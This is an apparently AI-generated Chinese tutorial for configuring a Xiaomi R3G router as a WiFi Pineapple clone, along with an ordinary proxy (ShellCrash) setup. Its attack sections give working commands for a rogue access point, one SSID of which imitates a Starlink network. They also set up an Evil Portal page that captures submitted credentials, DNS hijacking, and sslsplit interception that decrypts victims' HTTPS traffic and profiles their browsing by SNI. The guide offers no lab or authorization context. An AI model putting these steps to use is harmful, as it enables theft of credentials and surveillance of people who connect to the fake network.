---
AIGC:
    Label: "1"
    ContentProducer: 001191440300708461136T1XGW3
    ProduceID: 69862c49f4ec4e710eaf569fae513e34_c0c3460fa67311f1b3f6525400826444
    ReservedCode1: LyT8qjLsTYvyJqX2W7U4+cz8HoCpZl9zv/VaapV4/vRkIhYMSCRiCT5Njeb0c35rYrsge9R+yzD8BUkhIRQjM8Xnnn9RQZ8xaP/qVWgQdfYlARXwAsoRWOiIkDb2bUg4knPnBC5oXITWsvRtcKAY0/H+GIhbZq68DOzxMlmVGkZx3VY3VRI0aliGpX8=
    ContentPropagator: 001191440300708461136T1XGW3
    PropagateID: 69862c49f4ec4e710eaf569fae513e34_c0c3460fa67311f1b3f6525400826444
    ReservedCode2: LyT8qjLsTYvyJqX2W7U4+cz8HoCpZl9zv/VaapV4/vRkIhYMSCRiCT5Njeb0c35rYrsge9R+yzD8BUkhIRQjM8Xnnn9RQZ8xaP/qVWgQdfYlARXwAsoRWOiIkDb2bUg4knPnBC5oXITWsvRtcKAY0/H+GIhbZq68DOzxMlmVGkZx3VY3VRI0aliGpX8=
---

# R3G 路由器完整配置教程

> 适用设备：小米路由器 3G（R3G）
> 固件：OpenWrt 19.07.2 + Pineapple Cloner
> 本文整合 U 盘《刷机指南_必读.txt》《ShellCrash部署指南.md》及"问题排障"文件夹内各手册的实操细节，可对照逐步操作。

---

## 一、背景与硬件

| 项目 | 说明 |
|------|------|
| 设备 | 小米路由器 3G（R3G） |
| CPU / 架构 | MT7621，mipsel 24kc（注意：必须用 softfloat 版代理内核） |
| 存储 | UBI 117MB（高配版，可直接刷 19.07.2 + Cloner） |
| 固件 | OpenWrt 19.07.2 + Pineapple Cloner |
| WAN 管理 IP | 192.168.1.54（SSH 22，由上级交换机 DHCP 分配） |
| LAN 管理 IP | 172.16.42.1（Pineapple 面板 http://172.16.42.1:1471） |
| SSH 工具（电脑侧） | plink76.exe / pscp76.exe，密码 YOUR_ROOT_PASSWORD |

电脑侧 SSH 连接：

```sh
plink76.exe -ssh -batch -pw YOUR_ROOT_PASSWORD root@192.168.1.54
pscp76.exe -pw YOUR_ROOT_PASSWORD 本地文件 root@192.168.1.54:/tmp/
```

---

## 二、刷机流程

### 2.1 OpenWRTInvasion 漏洞开启 SSH/Telnet（原厂固件阶段）

1. 确认 R3G 为**原厂固件**且固件版本与漏洞利用工具匹配（OpenWRTInvasion 针对小米原厂固件 R3G 的 stok 漏洞）。
2. 电脑与路由器连接（R3G 原厂 LAN 口），浏览器登录原厂管理页，从 URL 中获取 `stok` 令牌。
3. 运行 OpenWRTInvasion 工具（Python 3），按提示输入路由器 IP 与 stok。
4. 利用成功后，路由器自动开启 Telnet/SSH，可登录获取 root shell。
5. 利用前确认路由器当前为原厂系统；若已经刷过其他固件，漏洞不再适用。

> 说明：本机刷机历史上使用 U 盘 + Reset 盲刷 Breed 的方式（见 2.2），OpenWRTInvasion 用于原厂系统下开启 SSH 通道，两者可互为备选。

### 2.2 刷入 Breed 不死引导（U 盘盲刷方式）

1. 拔掉路由器电源。
2. 将 U 盘（含刷机包）插到路由器背面 USB 口。
3. 牙签/取卡针按住背面 Reset 小孔不松手。
4. 插上电源（Reset 继续按住）。
5. 盯指示灯：黄灯常亮 → 变成**黄灯快速闪烁** → 松手。
   - 若 30 秒还不闪，拔电源重试，确认 U 盘插紧。
6. 等待约 2-3 分钟，指示灯最终变蓝灯或熄灭。
7. 拔电源、拔 U 盘，Breed 刷入完成。

### 2.3 进入 Breed 刷机界面

1. 网线连接电脑与路由器 **LAN 口（灰色口）**，不是蓝色 WAN 口。
2. 电脑设置静态 IP：
   - IP 地址：192.168.1.10
   - 子网掩码：255.255.255.0
   - 网关：192.168.1.1
   - DNS：192.168.1.1
3. 按住 Reset 插电，5 秒后松手。
4. 浏览器打开 http://192.168.1.1，看到黑底黄字 Breed 界面即成功。

### 2.4 刷入 OpenWrt 19.07.2 + Cloner

在 Breed 界面操作：

1. **设置环境变量（必须，否则重启可能回原厂）**
   - 左侧「环境变量编辑」→ 新增：
     - 名称：`xiaomi.r3g.bootfw`
     - 值：`2`
   - 点击添加 → 保存。
2. **刷过渡固件**
   - 「固件更新」→ 固件类型选「小米路由器3G 固件2」
   - 选择 `openwrt-r3g-initramfs.bin` → 上传 → 更新 → 等待重启（约 2 分钟）。
3. **刷正式固件**
   - 打开 http://192.168.1.1，登录（root / 空密码）。
   - System → Backup / Flash Firmware → 选择 `openwrt-r3g-sysupgrade.bin` → Flash image → 确认。
   - 建议**不保留配置**，等待自动重启（约 3 分钟）。

> 备选：Breed Web 直接刷 sysupgrade 可能报"数据无效"，此时走 initramfs 过渡再刷正式包（如上流程）。

### 2.5 获取 Pineapple 面板

- 刷好后 WAN 口接上级交换机，自动获取 IP（本机为 192.168.1.54）。
- LAN 管理地址 172.16.42.1，浏览器打开 **http://172.16.42.1:1471** 进入 Pineapple 面板。
- SSH 默认 root，密码本机为 YOUR_ROOT_PASSWORD。

---

## 三、假 AP 部署（原生 hostapd）

### 3.1 清理残留管理 AP（Pineapple_D853）

Pineapple 固件默认 wlan0/wlan0-1 为管理 AP（SSID Pineapple_D853）。若只用假 AP，将管理 AP 关闭：

```sh
uci set wireless.@wifi-iface[N].disabled='1'   # N 为管理 AP 所在 wifi-iface 序号
uci commit wireless
wifi reload
```

> 注意：`network` 字段属于 `config wifi-iface`（接口层），写在 `radio` 设备层会被忽略，接口会挂回 br-lan。

### 3.2 建 5G 假 AP（radio1/wlan1）

在无线配置中新增（或编辑）wifi-iface：

```sh
uci set wireless.@wifi-iface[?].device='radio1'
uci set wireless.@wifi-iface[?].ifname='wlan1'
uci set wireless.@wifi-iface[?].ssid='MarvisAP'          # 或 STARLINK 星链通讯
uci set wireless.@wifi-iface[?].encryption='psk2+ccmp'
uci set wireless.@wifi-iface[?].key='YOUR_WIFI_PASS'
uci set wireless.@wifi-iface[?].mode='ap'
uci set wireless.@wifi-iface[?].network='lan_fake'       # 独立接口，勿用 br-lan
uci commit wireless
wifi reload && wifi up radio1
```

要点：
- SSID 含中文时最大 **32 字节**（UTF-8 中文每字 3 字节），SSH 传中文易乱码，须用脚本上传或十六进制转义。
- 改完 `wifi reload` 后检查 hostapd：phy1 可能不随 reload 自动启动，需 `wifi up radio1`。

### 3.3 独立网段与 dnsmasq DHCP

**假 AP 网段必须与上级完全隔离**（如 10.66.0.0/24）。误用与上级 WAN 重叠网段会导致 DHCP 池包含 R3G 自身 WAN IP、ARP 失败。

持久化 DHCP 配置写 `/etc/dnsmasq.conf`（conf-file 被主配置引用，重启保留），**不要写 /tmp**：

```sh
cat > /etc/dnsmasq.conf << 'EOF'
# MarvisAP 假 AP DHCP 配置
dhcp-range=10.66.0.100,10.66.0.239,255.255.255.0,12h
dhcp-option=3,10.66.0.1
dhcp-option=6,10.66.0.1
log-dhcp
EOF
/etc/init.d/dnsmasq restart
```

坑：
- UCI dnsmasq 生成 DHCP 依赖接口 up；独立 up 状态的接口能正常产出 dhcp-range，lan 桥接口可能生成失败（固件 bug）。
- 若日志缺 "DHCP, IP range" 行、67 端口无监听，说明 dnsmasq 未加载 DHCP 配置，直接按上面写 `/etc/dnsmasq.conf` 修复。

### 3.4 MASQUERADE NAT

```sh
# 允许假 AP 网段
iptables -t nat -A POSTROUTING -s 10.66.0.0/24 -o eth0.2 -j MASQUERADE
iptables -A FORWARD -i wlan1 -o eth0.2 -j ACCEPT
iptables -A FORWARD -i eth0.2 -o wlan1 -m state --state RELATED,ESTABLISHED -j ACCEPT
```

坑：开启/关闭假 AP 后会残留 10.66 网段 ACCEPT/MASQUERADE 规则，清理时**必须带 `-i wlan1` 精确匹配**，否则删不掉或误删。

---

## 四、EvilPortal 门户

### 4.1 密钥认证门户（MyPortal.php）

Evil Portal 为 Pineapple 模块（模块市场目录 `/sd/modules/`）。门户页面通常由 PHP 编写：

1. 在 `/sd/modules/EvilPortal/` 下放置门户文件（如 `MyPortal.php`），页面内做**密钥认证**：提交的密钥正确才放行（跳转目标页），错误则提示重试。
2. 门户提交动作将输入记录到 `capture.php` 或日志文件，供后续提取。

### 4.2 nginx charset utf-8 与 Content-Type 乱码修复

门户中文乱码的修复点：

```sh
# nginx 站点配置内添加
charset utf-8;
# 且确保响应头 Content-Type 为
# Content-Type: text/html; charset=utf-8
```

修改后重载 nginx（`/etc/init.d/nginx restart` 或 `nginx -s reload`），再打开门户页验证中文正常。

### 4.3 captiveportal 启用

启用 captiveportal（强制门户）后，连接假 AP 的设备访问任意网址都会被重定向到门户页，从而强制完成密钥认证/采集流程。在 Pineapple 面板 Modules → Captive Portal 中启用，并指定门户文件（如 MyPortal）。

---

## 五、采集方案

### 5.1 DNS 域名劫持（dnsmasq address=/）

DNSspoof 模块不可用（依赖 dnsspoof 未装，且 dnsmasq 已监听假 AP 网段 53 端口冲突）时，用 dnsmasq 等价劫持：

```sh
# /etc/dnsmasq.conf 追加（每行劫持一个域名）
address=/example.com/10.66.0.1
/etc/init.d/dnsmasq restart
```

同时启用 DNS 查询日志：

```sh
# /etc/dnsmasq.conf 追加
log-queries
log-facility=/tmp/dnsmasq_dns.log
/etc/init.d/dnsmasq restart
```

### 5.2 capture.php（门户凭证采集）

在门户目录放置 `capture.php`，接收门户页 POST 的密钥/账号输入并落盘（如写入 `/sd/modules/EvilPortal/captures/` 下按时间戳命名的文件）。采集文件应设置可写权限。

### 5.3 sslsplit MITM（监听 10443 + 443 REDIRECT）

前提：安装 sslsplit（opkg 源超时时可从电脑侧下载 ipk 后 pscp 上传本地安装）。

```sh
# 1. 443 → 10443 REDIRECT（必须带 -i wlan1，只劫持假 AP 方向）
iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 443 -j REDIRECT --to-ports 10443

# 2. 启动 sslsplit（用双括号子 shell 后台拉起，避免 SSH 会话挂起）
(sslsplit -D -l /tmp/sslsplit_connect.log -k /tmp/cert/key.pem -c /tmp/cert/cert.pem \
  -S /tmp/ssl_dec -Z 10443 https 0.0.0.0 10443 &)
```

验证：

```sh
netstat -tlnp | grep 10443        # 确认监听
ls /tmp/ssl_dec                   # 解密输出目录；无 HTTPS 流量时为空是正常的
```

坑：`/etc/init.d/sslsplit start` 在 SSH 会话中会挂起，必须用 `(sslsplit ... &)` 拉起；REDIRECT 规则不带 `-i wlan1` 会应用到所有入接口，与透明代理冲突。

### 5.4 SNI 画像

- 通过 sslsplit 解密连接日志（`/tmp/sslsplit_connect.log`）或 tcpdump 抓包提取 TLS ClientHello 中的 **SNI**（服务器名称），即可获得目标设备的 HTTPS 访问画像。
- 与 DNS 日志（`log-queries`）交叉比对，可还原"域名级访问行为"。

---

## 六、ShellClash 代理

### 6.1 离线安装（R3G 专用）

1. **架构必须匹配**：MT7621 是 mipsel 24kc，**hardfloat 内核会 Illegal instruction**，必须用 softfloat 版（mihomo-mipsle-softfloat / `mihomo-mipsle-soft.gz`）。
2. **gzip 压缩极慢**：在 R3G 上 gzip 压缩内核会超时且 /tmp 空间不足。正确做法：电脑侧压缩好 gz，pscp 上传为 `CrashCore.gz`。
3. 安装 ShellCrash（1.9.4）到 `/etc/ShellCrash`（注意：不是 /etc/ShellClash），TMPDIR 改到 Flash 避免 /tmp 满。

```sh
# 电脑侧
pscp76.exe -pw YOUR_ROOT_PASSWORD CrashCore.gz root@192.168.1.54:/tmp/
# 路由器侧按 ShellCrash 安装流程放置后
/etc/init.d/shellcrash restart
```

> 启动脚本名是全小写 `shellcrash`，`ShellCrash` 不存在。

### 6.2 配置持久化与关键参数

修改必须写 `/etc/ShellCrash/yamls/config.yaml`（core_config 源）；只改 `/tmp/ShellCrash/config.yaml` 会被启动脚本 clash_modify.sh 覆盖。bfstart.sh 检测到 `yamls/config.yaml` 存在会跳过订阅下载直接使用。

```sh
# configs/ShellCrash.cfg 必须设置（否则 fw_start.sh 变量空报错，透明代理规则不加载）
# firewall_area=1   （1=本机+局域网，推荐）
# ipv6_redir=OFF
vi /etc/ShellCrash/configs/ShellCrash.cfg
```

DNS 段必须指向真实公共 DNS，禁止 127.0.0.1 自引用死循环：

```yaml
dns:
  enable: true
  listen: :1053
  default-nameserver:
    - 223.5.5.5
  direct-nameserver:
    - 223.5.5.5
  nameserver:
    - 223.5.5.5
  enhanced-mode: fake-ip
  fake-ip-range: 28.0.0.0/8
```

### 6.3 订阅导入（在线 403 的兜底方案）

在线订阅拉取常见失败（your-subscription.example.com 返回 520/522、HTTP 403 token is error、curl 模拟 Clash Verge UA 仍 403）。兜底：

1. 本机（有代理环境）Clash Verge profiles 目录提取已下载的 YAML。
2. 过滤占位假节点（`server` 为 `'1'`/`'11'`、`port` 为 1/11 的公告/教程节点）。
3. 合并骨架，写入 `yamls/config.yaml`，pscp 上传。

```sh
pscp76.exe -pw YOUR_ROOT_PASSWORD config.yaml root@192.168.1.54:/etc/ShellCrash/yamls/config.yaml
kill $(pidof CrashCore)
/etc/init.d/shellcrash restart
```

YAML 生成坑：节点压成单行会导致 CrashCore `-t` 校验失败、ShellCrash 回退基础配置；用 `default_flow_style=True` 流式格式可过校验。

### 6.4 API 切节点（PUT /proxies）

mihomo REST API：`PUT /proxies/组名`，body `{"name":"节点名"}`。

R3G 上无 curl/base64 时，中文 body 用 **printf 十六进制转义** 经 wget `--body-file` 发送：

```sh
# 例：切到"日本1"（UTF-8 十六进制 \xe6\x97\xa5\xe6\x9c\xac1）
printf '{"name":"\xe6\x97\xa5\xe6\x9c\xac1"}' > /tmp/body.json
wget -qO- --header='Content-Type: application/json' --body-file=/tmp/body.json \
  -X PUT http://127.0.0.1:9999/proxies/%E8%87%AA%E5%8A%A8%E9%80%89%E6%8B%A9

# 节点延迟测试（URL 中的中文需 percent-encode）
wget -qO- 'http://127.0.0.1:9999/proxies/%E6%97%A5%E6%9C%AC1/delay?timeout=3000&url=http://www.gstatic.com/generate_204'
```

> 注意：API 实时切换不写配置文件，重启 ShellClash 后回到默认选择组；需固定节点须改 `yamls/config.yaml`。

### 6.5 TUN 模式切换（全局接管）

```sh
# 1. 安装内核 TUN 模块（R3G 原内核无 tun）
#    opkg update 慢/超时，可从阿里云镜像手动 wget kmod-tun (4.14.171-1) 后：
opkg install /tmp/kmod-tun_*.ipk
modprobe tun            # 确认 /dev/net/tun 就绪

# 2. 切换为 TUN 模式（持久化）
#    在 /etc/ShellCrash/configs/ShellCrash.cfg 写入：
#    redir_mod=Tun模式
# 3. 重启
/etc/init.d/shellcrash restart
```

重启后生成的 tun 配置：

```yaml
tun:
  enable: true
  stack: system
  device: utun
  auto-route: false
  auto-detect-interface: false
```

路由由 ShellCrash 防火墙脚本管理：fw_start.sh 等待 utun 出现，`ip route add default dev utun table 100` + `ip rule fwmark 7894`；mihomo 自身 auto-route 为 false。

验证：

```sh
ip route show table all | grep utun     # utun 策略路由
netstat -tlnp | grep -E '7890|9999'     # 7890=tun, 9999=API
wget -qO- https://www.gstatic.com/generate_204   # 出海 0
wget -qO- https://www.baidu.com                  # 国内 0
```

TUN 注意事项：
- IPv6 受限：内核缺 ip6table_nat，重启时 ip6tables nat 报 "Table does not exist"；IPv4 不受影响，可装 kmod-ipt-nat6 修复。
- TUN 模式 CPU 占用高于 Redir 模式，R3G 性能有限，日常代理可切回 Redir 模式省资源。

---

## 七、互斥切换（mode_switch.sh）

ShellClash 透明代理（劫持 53/80/443）与 sslsplit 443 REDIRECT 会冲突，用互斥切换脚本：

```sh
/usr/bin/mode_switch.sh pine|clash|status
```

| 参数 | 行为 |
|------|------|
| `pine` | 渗透模式：先停 ShellCrash，再启动 sslsplit/门户等渗透服务 |
| `clash` | 代理模式：停止渗透服务（sslsplit），启动 ShellCrash 透明代理 |
| `status` | 查看当前模式状态 |

原理：同一时刻只保留一套"流量接管"体系，避免 443 劫持打架、iptables/nftables 规则互相残留。

---

## 八、WiFi 与网络规划

当前网络拓扑红线（**用户红线，务必遵守**）：

1. **唯一上网 WiFi = STARLINK 星链通讯**（radio1 5G，ch153），保持可用。
2. **管理 WiFi 已关闭**：wlan0/wlan0-1（Pineapple_D853 等）已 `disabled='1'`，不要重新启用。
3. **上级交换机网段 192.168.1.0/22**：不杀主网络、**不改 WAN IP**（WAN 保持 192.168.1.54 DHCP 自动获取）。
4. 假 AP 使用独立网段 10.66.0.0/24，与上级 192.168.1.0/22 完全隔离。

管理入口汇总：

| 用途 | 地址 |
|------|------|
| OpenWrt LuCI / SSH | 192.168.1.54（WAN） |
| Pineapple 面板 | http://172.16.42.1:1471（LAN） |
| ShellCrash API | 127.0.0.1:9999 |

---

## 九、常见坑与排障速查

### 9.1 刷机与固件
- 刷 Breed 前确认原厂固件版本与 OpenWRTInvasion 匹配；刷后验证 `xiaomi.r3g.bootfw=2`。
- R3G 分高低配，高配（UBI 117MB）直接刷；低配需先扩容，勿混用固件。
- Breed Web 直接刷 sysupgrade 报数据无效 → 走 initramfs 过渡。

### 9.2 假 AP / DHCP
- 假 AP 网段必须独立，误用与上级重叠网段 → DHCP 池含 WAN IP、ARP 失败。
- dnsmasq 无 "DHCP, IP range" 日志、67 端口无监听 → UCI 生成失败，直接写 `/etc/dnsmasq.conf`。
- 禁止 `udhcpc -i br-lan` 自测 DHCP（桥不回环自身包），从桥外发 Discover 验证。
- iptables FORWARD 拦不住桥内二层 DHCP 转发（br_netfilter 未加载），不要在它身上浪费时间。
- PineAP CLI 带配置路径会重写丢配置 → 优先 `uci set + uci commit + /etc/init.d/pineapd restart`。

### 9.3 代理（ShellCrash）
- **hardfloat 内核 Illegal instruction** → 必须 mihomo-mipsle-softfloat。
- **gzip 压缩极慢/超时** → 电脑侧压好 gz 再 pscp 上传。
- **opkg 锁死**：`/var/lock/opkg.lock` 被占用 → kill 残留 opkg 进程并删除锁文件；opkg update 慢直接从阿里云镜像 wget ipk 本地安装。
- **防火墙不生效**：`firewall_area` 缺失/`ipv6_redir` 未定义 → fw_start.sh 报 out of range，nftables 规则不加载；补 `firewall_area=1` + `ipv6_redir=OFF` 后 `sh /etc/ShellCrash/starts/fw_start.sh`。
- **DNS 死循环**：nameserver/direct-nameserver 指 127.0.0.1 → 改 223.5.5.5。
- **重启后规则丢失**：afstart.sh 异步等待 CrashCore/utun 超时 → 等 15 秒再查 `nft list table inet shellcrash`，兜底 rc.local 延迟 30 秒重试 fw_start.sh。
- **.start_error 哨兵**：上次异常退出阻止自启 → `rm -f /etc/ShellCrash/.start_error && /etc/init.d/shellcrash restart`。
- **订阅假节点**：占位节点（server:1/11）污染 url-test → 本机提取 YAML 时过滤。
- **CrashCore 日志不可见**：stdout/stderr 重定向 /dev/null，排查靠 API（nc 127.0.0.1 9999）和抓包。

### 9.4 中文与编码
- SSH/plink 传中文（SSID、节点名、redir_mod 值）易乱码 → 用 printf 十六进制转义：
  - `"模式"` = `\xe6\xa8\xa1\xe5\xbc\x8f`
  - `"日本1"` = `\xe6\x97\xa5\xe6\x9c\xac1`
- URL 中的中文需 percent-encode。

### 9.5 常用命令速查

```sh
# SSH / 传输（电脑侧）
plink76.exe -ssh -batch -pw YOUR_ROOT_PASSWORD root@192.168.1.54
pscp76.exe -pw YOUR_ROOT_PASSWORD 本地文件 root@192.168.1.54:/tmp/

# 互斥切换
/usr/bin/mode_switch.sh pine|clash|status

# 无线 / 防火墙 / DNS
wifi reload && wifi up radio1
/etc/init.d/firewall restart
/etc/init.d/dnsmasq restart

# 代理状态
pidof CrashCore
nft list table inet shellcrash | grep -c chain
ip route show table all | grep utun
http_proxy=http://127.0.0.1:7890 wget -q -O - -T5 http://www.gstatic.com/generate_204
wget -q -O - http://127.0.0.1:9999/proxies
```

### 9.6 参考文档

- U 盘"问题排障"文件夹：
  - `TROUBLESHOOTING.md`（疑难杂症与避坑手册）
  - `R3G_ShellCrash_故障排查手册.md`（ShellClash 故障手册）
  - `R3G全局TUN模式注意事项.md`（TUN 模式变更与注意事项）
- U 盘根目录：
  - `刷机指南_必读.txt`（刷机傻瓜指南）
  - `ShellCrash部署指南.md`（ShellCrash 部署手册）
*（内容由AI生成，仅供参考）*
